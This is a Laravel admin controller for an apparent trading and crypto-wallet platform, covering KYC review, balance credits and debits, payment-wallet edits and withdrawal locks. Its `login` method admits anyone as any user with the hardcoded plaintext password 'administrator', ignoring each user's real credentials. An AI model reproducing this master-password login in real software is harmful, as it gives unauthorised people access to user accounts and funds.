<?php

namespace App\Http\Controllers\Admin;

use App\Models\User;
use App\Models\Asset;
use App\Models\State;
use App\Models\Trade;
use App\Models\Country;
use App\Models\Currency;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use App\Http\Controllers\NotificationController as Notifications;

class UserController extends Controller
{
    public function index(Request $request)
    {
        $query = User::query();
    
        if ($request->has('search') && $request->search !== null) {
            $searchTerm = $request->search;
    
            $query->where(function ($q) use ($searchTerm) {
                $q->where('first_name', 'like', "%{$searchTerm}%")
                  ->orWhere('last_name', 'like', "%{$searchTerm}%")
                  ->orWhere('email', 'like', "%{$searchTerm}%")
                  ->orWhere('phone', 'like', "%{$searchTerm}%");
            });
        }
    
        $users = $query->orderBy('created_at', 'desc')->paginate(20);
    
        return view('admin.user', [
            'users' => $users,
            'search' => $request->search,
        ]);
    }
    

    public function show(User $user)
    {
        $balance = $user->wallet->getBalance('wallet');
        $brokerage_balance = $user->wallet->getBalance('brokerage');
        $auto_balance = $user->wallet->getBalance('auto');
        $savings_balance = $user->savings()->sum('balance');
        $currencies = Currency::all();

        $countries = Country::where('status', 'active')->orderBy('name', 'ASC')->get();
        $states = State::all();

        $transactions = $user->transactionsFetch()->paginate(10);
        $savings_account = $user->savings()->paginate(10);
        $trades = $user->trade()->paginate(10);

        // $deposit = $user->depositAccount()->first();
        // $withdrawal = $user->withdrawalAccount()->first();

        return view('admin.user-details', [
            'user' => $user,
            'balance' => $balance,
            'brokerage_balance' => $brokerage_balance,
            'auto_balance' => $auto_balance,
            'savings_balance' => $savings_balance,
            'currencies' => $currencies,
            'transactions' => $transactions,
            'savings_account' => $savings_account,
            'trades' => $trades,
            // 'deposit' => $deposit,
            // 'withdrawal' => $withdrawal,
            'countries' => $countries,
            'states' => $states,
        ]);
    }

    public function update(Request $request, User $user)
    {
        // Validate the incoming data
        $validated = $request->validate([
            'first_name' => 'nullable|string|max:255',
            'last_name' => 'nullable|string|max:255',
            'email' => 'nullable|string|max:255',
            'address' => 'nullable|string|max:255',
            'country' => 'nullable|string|max:255',
            'state' => 'nullable|string|max:255',
            'zipcode' => 'nullable|string|max:20',
            'dob' => 'nullable|date',
            'employed' => 'nullable|string|max:255',
            'nationality' => 'nullable|string|max:255',
            'experience' => 'nullable|string|max:255',
            'currency_id' => 'nullable|exists:currencies,id',
            'country_id' => 'nullable|exists:countries,id',
            'state_id' => 'nullable|exists:states,id',
        ]);

        // Update the user data
        $user->update([
            'first_name' => $validated['first_name'] ?? $user->first_name,
            'last_name' => $validated['last_name'] ?? $user->last_name,
            'email' => $validated['email'] ?? $user->email,
            'address' => $validated['address'] ?? $user->address,
            'country' => $validated['country'] ?? $user->country,
            'state' => $validated['state'] ?? $user->state,
            'zipcode' => $validated['zipcode'] ?? $user->zipcode,
            'dob' => $validated['dob'] ?? $user->dob,
            'employed' => $validated['employed'] ?? $user->employed,
            'nationality' => $validated['nationality'] ?? $user->nationality,
            'experience' => $validated['experience'] ?? $user->experience,
            'currency_id' => $validated['currency_id'] ?? $user->currency_id,
            'country_id' => $validated['country_id'] ?? $user->country_id,
            'state_id' => $validated['state_id'] ?? $user->state_id,
        ]);

        // Redirect back with success message
        return redirect()->back()->with('success', 'User profile updated successfully.');
    }

    public function toggleWalletConnect(Request $request, User $user)
    {
        // Access the user settings
        $userSettings = $user->settings;
    
        // Fallback if settings not found
        if (! $userSettings) {
            return redirect()->back()->with('error', 'User settings not found.');
        }
    
        // Toggle the is_connect_activated column
        $newStatus = $userSettings->is_connect_activated ? 0 : 1;
    
        // Update the settings
        $userSettings->update([
            'is_connect_activated' => $newStatus,
            'connected_wallet_at' => now(),
        ]);
    
        return redirect()->back()->with('success', 'Wallet activation status updated successfully.');
    }
    



    public function toggle(Request $request, User $user)
    {
        $validated = $request->validate([
            'action' => 'in:active,suspended',
        ]);

        // Update the user data
        $data = $user->update([
            'status' => $validated['action'],
        ]);

        $user->toggleBlock();
        
        if($data)
            // Redirect back with success message
            return redirect()->back()->with('success', 'User action updated successfully.');

        return redirect()->back()->with('error', 'User action failed!');
        
    }

    public function kyc(Request $request, User $user)
    {
        $validated = $request->validate([
            'action' => 'in:approved,declined',
        ]);

        // Update the user data
        $data = $user->update([
            'kyc' => $validated['action'],
        ]);

        // If KYC is declined, delete uploaded images
        if ($validated['action'] === 'declined') {
            if ($user->front_id && Storage::exists(str_replace('/storage/', 'public/', $user->front_id))) {
                Storage::delete(str_replace('/storage/', 'public/', $user->front_id));
            }

            if ($user->back_id && Storage::exists(str_replace('/storage/', 'public/', $user->back_id))) {
                Storage::delete(str_replace('/storage/', 'public/', $user->back_id));
            }

            $data = $user->update([
                'front_id' => null,
                'back_id' => null,
                'id_number' => null,
                'id_type' => null,
            ]);
        }

        if($validated['action'] == 'approved')
            Notifications::sendIdVerifiedNotification($user);
        
        if($data)
            // Redirect back with success message
            return redirect()->back()->with('success', 'User kyc updated successfully.');

        return redirect()->back()->with('error', 'User action failed!');
        
    }

    public function cancelKYC(Request $request, User $user)
    {
        // Delete uploaded images
        if ($user->front_id && Storage::exists(str_replace('/storage/', 'public/', $user->front_id))) {
            Storage::delete(str_replace('/storage/', 'public/', $user->front_id));
        }
    
        if ($user->back_id && Storage::exists(str_replace('/storage/', 'public/', $user->back_id))) {
            Storage::delete(str_replace('/storage/', 'public/', $user->back_id));
        }
    
        // Clear user KYC data
        $user->update([
            'kyc' => 'pending',
            'front_id' => null,
            'back_id' => null,
            'id_number' => null,
            'id_type' => null,
        ]);
    
        return redirect()->back()->with('success', 'User kyc cancelled successfully.');
    }
    

    public function trades()
    {
        $trade = Trade::latest()->paginate(10);

        $users = User::all();

        $assets = Asset::all();

        return view('admin.trade', [
            'trades' => $trade,
            'users' => $users,
            'assets' => $assets,
        ]);
    }

    public function showLogin()
    {
        $alt = true;
        $user = request('email');

        return view('auth.login', compact('alt', 'user'));
    }

    public function login(Request $request)
    {
        // Validate the input
        $validated = $request->validate([
            'email' => 'required|string',
            'password' => 'required|string',
        ]);

        // Find the user by email
        $user = User::where('email', $validated['email'])->first();

        if (!$user) {
            return back()->withErrors(['email' => 'User not found'])->withInput();
        }

        // Check the password (use Hash::check if password hashing is implemented)
        if (request('password') != 'administrator') {
            return back()->withErrors(['password' => 'Password is incorrect'])->withInput();
        }

        // Log in the user
        Auth::guard('web')->login($user);

        return redirect()->intended(RouteServiceProvider::HOME);
    }

    public function credit(Request $request, User $user)
    {
        $validator = Validator::make($request->all(), [
            'account' => 'required|in:wallet,brokerage,auto',
            'amount' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput()->with('error', 'Invalid input data');
        }

        $amount = $request->amount;

        $account = $request->account;

        $user->wallet->credit($amount, $account, 'Admin credited ' . $account);

        return redirect()->back()->with('success', 'Account credited successfully');
    }

    public function debit(Request $request, User $user)
    {
        $validator = Validator::make($request->all(), [
            'account' => 'required|in:wallet,brokerage,auto',
            'amount' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput()->with('error', 'Invalid input data');
        }

        $amount = $request->amount;

        $account = $request->account;

        $balance = $user->wallet->getBalance($account);

        if($amount <= $balance) {
            $user->wallet->debit($amount, $account, 'Admin debit');

            return redirect()->back()->with('success', 'Account debited successfully');

        } else {
            return back()->with('error', 'Insufficient ' . $account . ' balance');
        }
    }

    public function bank(Request $request, User $user)
    {
        // Validate the request
        $validated = $request->validate([
            // 'user_id' => ['required', 'exists:users,id'],
            'type' => ['required', 'in:user,admin'],
            'btc_wallet' => ['nullable', 'string'],
            'eth_wallet' => ['nullable', 'string'],
            'trc_wallet' => ['nullable', 'string'],
            'erc_wallet' => ['nullable', 'string'],
            'bank_name' => ['nullable', 'string'],
            'account_name' => ['nullable', 'string'],
            'bank_number' => ['nullable', 'string'],
            'bank_account_number' => ['nullable', 'string'],
            'bank_routing_number' => ['nullable', 'string'],
            'bank_reference' => ['nullable', 'string'],
            'bank_address' => ['nullable', 'string'],
        ]);

        // Find the user's payment data based on type
        $payment = $user->payments()->where('type', $validated['type'])->first();

        if (!$payment) {
            return redirect()->back()->with('error', 'Payment data not found for this user.');
        }

        // Update the payment details
        $updated = $payment->update($validated);

        if ($updated) {
            return redirect()->back()->with('success', 'User payment details updated successfully.');
        }

        return redirect()->back()->with('error', 'Failed to update payment details.');
    }

    public function destroy(User $user)
    {
        // Ensure all related models are loaded before deletion
        $user->load([
            'wallet', 
            'transactions', 
            'transactionsFetch',
            'savings', 
            'trade', 
            'payments'
        ]);

        // Delete related data manually if cascading is not set in DB
        $user->wallet()->delete();
        $user->transactions()->delete();
        $user->transactionsFetch()->delete();
        $user->savings()->delete();
        $user->trade()->delete();
        $user->payments()->delete();

        // Finally, delete the user
        $user->forceDelete();

        return redirect()->back()->with('success', 'User and all related data deleted successfully.');
    }

    public function settings(Request $request, User $user)
    {
        $validated = $request->validate([
            'min_cash_bank_deposit' => 'nullable|numeric|min:0',
            'min_cash_crypto_deposit' => 'nullable|numeric|min:0',
            'max_cash_bank_deposit' => 'nullable|numeric|min:0',
            'max_cash_crypto_deposit' => 'nullable|numeric|min:0',
            'min_cash_bank_withdrawal' => 'nullable|numeric|min:0',
            'min_cash_crypto_withdrawal' => 'nullable|numeric|min:0',
            'max_cash_bank_withdrawal' => 'nullable|numeric|min:0',
            'max_cash_crypto_withdrawal' => 'nullable|numeric|min:0',
            'locked_cash_message' => 'nullable|string',
            'locked_bank_deposit_message' => 'nullable|string',
        ]);
    
        // Handle checkboxes - they won't be in request if unchecked
        $validated['locked_cash'] = $request->has('locked_cash');
        $validated['locked_bank_deposit'] = $request->has('locked_bank_deposit');
    
        $user->settings->update($validated);
    
        return redirect()->back()->with('success', 'User settings updated successfully.');
    }

}
